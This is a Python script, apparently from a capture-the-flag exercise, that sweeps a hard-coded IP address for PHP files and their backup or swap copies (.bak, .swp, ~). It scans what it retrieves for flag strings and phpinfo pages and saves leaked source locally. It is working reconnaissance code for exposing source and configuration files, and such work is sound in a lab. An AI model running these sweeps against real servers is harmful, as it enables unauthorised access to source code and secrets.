#!/usr/bin/env python3
import requests
import re

BASE = "http://15.206.47.5:8080"

# Likely interesting base names
CANDIDATE_BASENAMES = [
    "jsonhandler.php",
    "login.php",
    "index.php",
    "config.php",
    "debug.php",
    "test.php",
    "phpinfo.php",
]

SUFFIXES = [
    "",         # the actual file
    ".bak",
    ".backup",
    ".old",
    ".orig",
    ".save",
    ".swp",
    ".swo",
    "~",
    ".txt",
]

FLAG_PATTERNS = [
    r"flag\{[^}]+\}",
    r"FLAG\{[^}]+\}",
    r"csictf\{[^}]+\}",
    r"CSK\{[^}]+\}",
    r"CTF\{[^}]+\}",
]

def find_flags(text):
    found = []
    for pat in FLAG_PATTERNS:
        found += re.findall(pat, text)
    return list(set(found))

def main():
    s = requests.Session()

    for base in CANDIDATE_BASENAMES:
        for suf in SUFFIXES:
            path = f"/{base}{suf}"
            url = BASE + path
            try:
                print(f"[*] GET {url}")
                r = s.get(url, timeout=5)
                print(f"    Status: {r.status_code}, len={len(r.content)}")

                # ignore obvious 404 plain pages
                if r.status_code != 200:
                    continue

                text = r.text

                # Look for flag-ish strings
                flags = find_flags(text)
                if flags:
                    print(f"[+] Possible flag(s) in {path}:")
                    for f in flags:
                        print("    ", f)
                    return

                # Look for env / debug hints
                if "phpinfo()" in text or "PHP Version" in text or "Environment" in text:
                    print(f"[+] Possible phpinfo/debug at {path}, inspect manually.")
                    print(text[:500])
                    return

                if "json_response" in text or "json_die" in text or "_DATA" in text:
                    print(f"[+] Interesting source at {path}, saved locally.")
                    with open(base + suf.replace("/", "_"), "w", encoding="utf-8", errors="ignore") as f:
                        f.write(text)

            except Exception as e:
                print(f"[!] Error on {url}: {e}")

    print("[-] No obvious flags found in this sweep. You may need a bigger wordlist or manual browsing.")

if __name__ == "__main__":
    main()
